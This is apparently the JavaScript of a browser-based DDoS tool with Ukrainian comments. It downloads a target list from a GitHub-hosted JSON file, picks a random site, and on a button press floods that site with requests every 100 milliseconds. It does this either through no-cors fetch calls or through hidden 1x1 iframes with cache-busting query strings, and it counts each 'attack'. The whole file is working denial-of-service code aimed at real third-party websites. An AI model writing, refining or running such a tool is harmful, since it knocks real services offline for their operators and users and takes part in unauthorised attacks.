// Звідси будуть завантажуватись цілі
const targetSource = 'https://raw.githubusercontent.com/opengs/uashieldtargets/test/sites.json'


// Функції для керування документом
let frameDiv = $("#frame")

const getId = (id) => document.getElementById(id)
let attacks = getId("attacks")

// Функції рандому
const add_count = () => attacks.textContent++
const randint = (num) => Math.floor(Math.random() * num)

const getRandomArbitrary = (min, max) => Math.random() * (max - min) + min

async function getSalt(target) {
	const now = (new Date()).getTime();
	return target + '?' + now + getRandomArbitrary(100_000, 1_000_000);
}


// Завантаження цілей
async function getTarget() {
    targets = await fetch(targetSource);
    data = await targets.json();

    targets = [];
    for (var i = 0; i < data.length; i++) {
        if (['post', 'get'].includes(data[i].method)) {
        	targets.push(data[i])
        }
    };

    return targets[randint(targets.length)] // Рандомна ціль
}


const Frames = {
	async draw(target, id) {
		const framediv = frameDiv;
		$("<iframe>", {
			src: target,
			id: "frame" + id,
			frameborder: 0,
			width: 1,
			height: 1
		}).appendTo(framediv);
	},
	clear() {frameDiv.empty()}
}


class Doser {
    attack = false; // Status of attack
    interval;

    async start(isFetch=false) {
    	this.attack = true;

        // Startup interval of DDoS attack

        btn.textContent = "Стоп";
        let target = await getTarget()

        console.log(target)

        let targ = getId("target");
        let method = getId("method");
        targ.textContent = target.page;
        method.textContent = target.method.toUpperCase();

        this.interval = setInterval(isFetch ? async function () {
            // Requests

            await fetch([target.page], {
	            method: target.method,
	            mode: 'no-cors',
				referrerPolicy: 'no-referrer'
	        }).then(() => {
	            // After requests

	            console.log("Ok!");
	            add_count();
	        })
        } : async function () {
        	targ = await getSalt(target.page);

        	// Надсилання запиту на сайт за допомогою iframe
        	await Frames.draw(targ, randint(0, 100_000));
        	console.log(targ);

        	add_count();

        	if (getId("frame").childElementCount > 200) {Frames.clear()};
        }, 100);
    };
    stop() {
    	this.attack = false;
    	clearInterval(this.interval);
    	Frames.clear()
    	btn.textContent = "Старт!";
    };
}



let btn = getId("button")
Doser = new Doser

btn.addEventListener('click', (e) => {
	e.preventDefault();

	// If not attack, start attack else stop attack
	!Doser.attack ? Doser.start() : Doser.stop();
})

// Слава Україні!